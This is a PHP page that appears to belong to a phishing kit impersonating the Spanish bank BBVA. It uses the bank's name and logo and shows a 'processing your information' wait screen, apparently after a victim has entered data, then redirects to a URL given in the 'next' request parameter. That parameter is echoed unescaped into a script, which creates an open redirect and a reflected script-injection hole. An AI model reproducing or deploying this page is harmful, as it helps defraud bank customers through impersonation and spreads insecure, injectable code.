<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BBVA</title>
    <link rel="stylesheet" href="res/css/app.css">
</head>
<body>
<header class="header">
            <div class="logo">
            <img src="res\img\logoo.png">
            </div>
            <div class="links">
                <a href="#">Acceso a la banca online</a> |
                <a href="#">Ir a BBVA.es</a>
            </div>
        </header>
<main>

    <div class="container" style="text-align:center;">

       
    <h2>Por favor espera...</h2>
 <p>Procesando su información...</p>

<p>
<img src="res/img/loading.gif" style="width:80px;">
</p>    
    </div>
    </main>

<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script> 
</body>
</html>
